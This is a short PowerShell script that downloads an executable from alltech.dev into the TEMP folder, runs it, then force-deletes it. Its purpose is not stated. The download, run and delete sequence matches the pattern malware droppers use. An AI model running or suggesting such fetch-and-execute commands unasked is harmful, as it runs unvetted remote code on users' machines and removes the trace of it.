$exe = "$env:TEMP\f21.exe"
Invoke-WebRequest 'https://alltech.dev/F21-replace-jar.exe' -OutFile $exe
Start-Process $exe -Wait
Remove-Item $exe -Force
